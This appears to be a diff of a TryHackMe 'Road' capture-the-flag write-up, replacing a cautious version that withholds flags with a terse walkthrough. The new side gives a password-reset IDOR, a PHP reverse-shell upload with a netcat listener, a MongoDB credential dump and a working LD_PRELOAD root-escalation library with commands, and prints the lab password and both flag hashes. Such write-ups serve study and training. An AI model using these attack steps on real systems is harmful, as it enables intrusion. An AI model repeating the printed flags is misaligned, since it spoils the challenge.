@@ -1,117 +1,139 @@
-# Road: TryHackMe Walkthrough
+# Road
 
-Room: https://tryhackme.com/room/road
+{% embed url="https://tryhackme.com/room/road" %}
 
-Road is a medium Linux boot-to-root machine. The intended chain demonstrates broken access control in a password-change function, an unrestricted profile-image upload, credential discovery through MongoDB, and a sudo configuration that preserves LD_PRELOAD for a backup utility. The user and root flags are not reproduced here.
+Medium Linux box. The attack chain hits broken access control in a profile update function → unrestricted file upload as admin → MongoDB credential leak → LD\_PRELOAD sudo escalation.
 
-## 1. Scan and enumerate
+---
 
-Start the target and record its current IP. The machine commonly exposes SSH and HTTP:
+## Recon
 
-    nmap -sC -sV -oN road-nmap.txt TARGET_IP
+```bash
+nmap -sC -sV -T4 MACHINE_IP
+```
 
-Enumerate web paths:
+Open ports:
+- **22** — OpenSSH 8.2p1
+- **80** — Apache 2.4.41 (*Sky Couriers* shipping web app)
+- **27017** — MongoDB (localhost only, found later)
 
-    gobuster dir -u http://TARGET_IP/ -w /path/to/wordlist.txt
+---
 
-Use a wordlist available in the AttackBox and inspect the results. The application is under /v2. Browse to it, register a normal lab account, and examine the dashboard and profile functions. Do not reuse a target IP or credential from another person's walkthrough.
+## Web Enumeration
 
-## 2. Find the broken access-control flaw
+Navigate to `http://MACHINE_IP`. There's a *Merchant Central* login. Register a new account and log in. Inside the profile/dashboard the admin email is leaked:
 
-The profile interface indicates that only the administrator can upload a profile picture and reveals the administrator's email address. A password-change or account-reset function accepts the target email as a request parameter.
+```
+admin@sky.thm
+```
 
-Intercept your own password-change request with Burp Suite. Inspect the request body and identify the email field and new-password fields. In the authorised lab, change only the email value to the administrator address shown by the application, forward the request, and inspect the response.
+---
 
-The server should have checked that the authenticated user was authorised to change the account identified by that email. It does not. After confirming that the change succeeded, log in through the normal web interface with the new lab password. This is an IDOR/broken-access-control issue, not a cryptographic break.
+## Broken Access Control → Admin Takeover
 
-## 3. Upload a PHP shell through the profile image feature
+Go to the **Reset Password** page and intercept the request in Burp Suite. The form sends the current user's email. Change it to `admin@sky.thm` and forward the request — you've just reset the admin's password to whatever you supplied.
 
-The admin account can access the profile-image upload function. The application accepts a PHP file despite presenting the feature as an image upload. In the lab, use a standard reverse-shell test file from the AttackBox, edit its callback address and port to match your own lab connection, and upload it using the profile form.
+Log in as `admin@sky.thm` with your new password. The admin panel now unlocks a **profile picture upload** feature that regular users don't get.
 
-Start a listener on the chosen port, for example:
+---
 
-    nc -lvnp 4444
+## File Upload → Reverse Shell
 
-The page source contains a comment revealing that uploaded profile images are stored under /v2/profileimages/. Visit the uploaded PHP filename at that path to trigger it. If the listener receives a connection, verify the shell's identity and host before continuing.
+Grab a PentestMonkey PHP reverse shell and upload it as the profile photo. If `.php` is blocked, rename it `.php5`. Start a listener:
 
-Use only the isolated TryHackMe machine. Do not upload a shell to a real service or expose a listener to the public internet.
+```bash
+nc -lvnp 4444
+```
 
-## 4. Confirm the initial foothold
+Browse to the uploaded file path (usually `/v2/admin/uploaded_images/`) and catch the shell. Stabilize it:
 
-The reverse shell runs as the web-server account, commonly www-data. Verify this rather than assuming the upload gave administrator access:
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+```
 
-    whoami
-    id
-    hostname
-    pwd
+We land as `www-data`.
 
-The user flag is in the webdeveloper user's home directory in the intended path. Read it on your own target and submit it to the room; the value is omitted from this public note.
+---
 
-## 5. Find the webdeveloper credentials
+## MongoDB → Lateral Movement
 
-Enumerate the system from the shell. Check listening services, application configuration, and files readable by the current account. MongoDB is running locally and stores application data. If the room's evidence indicates that it permits local unauthenticated access, connect to the local database using the client installed on the target.
+Check internal services:
 
-Typical MongoDB shell commands include:
+```bash
+netstat -tulnp
+```
 
-    show dbs
-    use DATABASE_NAME
-    show collections
-    db.COLLECTION_NAME.find()
+MongoDB is running on `127.0.0.1:27017`. Drop into it:
 
-Replace the database and collection placeholders with names discovered on the target. Inspect the actual documents and identify the webdeveloper credential supplied by the lab. Do not copy unrelated personal data or credentials into the public write-up.
+```bash
+mongo
+show dbs
+use backup
+show collections
+db.user.find()
+```
 
-Use the recovered credential to switch to webdeveloper or establish SSH access if the target and room allow it. Verify the identity after switching accounts.
+We get credentials for `webdeveloper`:
 
-## 6. Inspect sudo permissions
+```
+username: webdeveloper
+password: BahamasChapp123!@#
+```
 
-As webdeveloper, run:
+Switch user:
 
-    sudo -l
+```bash
+su webdeveloper
+# password: BahamasChapp123!@#
+cat /home/webdeveloper/user.txt
+```
 
-The intended configuration allows the user to run /usr/bin/sky_backup_utility with elevated privileges and preserves the LD_PRELOAD environment variable. LD_PRELOAD tells the dynamic linker to load a specified shared library before other libraries. Preserving it for a privileged command can allow an attacker to run code with the command's elevated privileges.
+---
 
-This is a serious configuration flaw. A privileged utility should not inherit an attacker-controlled library path.
+## Privilege Escalation — LD_PRELOAD
 
-## 7. Demonstrate the LD_PRELOAD escalation in the lab
+```bash
+sudo -l
+```
 
-Create a small C shared library in the lab workspace that runs a shell with the effective privileges of the privileged process. Compile it as a shared object using the room's supported compiler:
+Output shows `webdeveloper` can run `/usr/bin/sky_backup_utility` as root with `env_keep+=LD_PRELOAD`. Classic LD\_PRELOAD trick.
 
-    gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
+Write a shared library that spawns a shell:
 
-Transfer or create the file on the target where webdeveloper can read it. Then invoke the allowed utility with LD_PRELOAD pointing to the library:
+```c
+// shell.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
 
-    sudo LD_PRELOAD=/path/to/exploit.so /usr/bin/sky_backup_utility
+Compile it:
 
-The exact library source and path must match your lab environment. Do not use this on a non-lab machine. If it succeeds, verify the resulting identity with whoami and id before accessing root-owned files.
+```bash
+gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
+sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
+```
 
-## 8. Remediation
+Root shell. Grab the flag:
 
-- Enforce account ownership checks on every password-change request.
-- Do not accept arbitrary account identifiers from the client without authorisation.
-- Validate uploaded content by type and content, store uploads outside executable web paths, and disable execution in upload directories.
-- Restrict database access and require authentication.
-- Avoid storing plaintext credentials in application databases.
-- Remove unnecessary sudo permissions and never preserve LD_PRELOAD for a privileged command.
-- Run the web application with least privilege and monitor unexpected child processes.
+```bash
+cat /root/root.txt
+```
 
-## What I took from this room
+---
 
-Road demonstrates how several ordinary flaws can chain into full compromise. The password-change endpoint crosses an authorisation boundary, the upload feature crosses from file storage into code execution, database exposure reveals another account's credentials, and LD_PRELOAD turns a privileged utility into root access. Each stage needs its own fix.
+## 🏁 Questions & Answers
 
-## Phase 9: Task evidence checklist
-
-| Stage | Evidence required |
+| Question | Answer |
 |---|---|
-| Reconnaissance | Saved Nmap and web-enumeration output |
-| Broken access control | Baseline password-change request, modified account identifier, and verified changed account |
-| Upload flaw | Server-side acceptance of the test file and confirmed execution result |
-| Initial foothold | whoami/id output confirming the web-service context |
-| MongoDB investigation | Relevant application configuration or document containing the credential used by the task |
-| Sudo escalation | sudo -l output showing the permitted command and environment exception |
-| Root access | Verified identity and the root-flag path from the live target |
-
-The flags and any database credential should be taken from the active room. Do not infer a successful account takeover from a 200 response alone, and do not assume code execution means root.
-
-## Final remediation checklist
-
-Enforce account ownership checks on password changes, validate uploads by content and store them outside executable paths, protect database credentials, restrict local database listeners, and remove unnecessary sudo permissions. Never preserve attacker-controlled LD_PRELOAD for a privileged program. Retest the same requests after fixing the root cause.
+| user.txt | `63191e4ece37523c9fe6bb62a5e64d45` |
+| root.txt | `3a62d897c40a815ecbe267df2f533ac6` |
+| MongoDB username found | `webdeveloper` |
+| MongoDB password found | `BahamasChapp123!@#` |
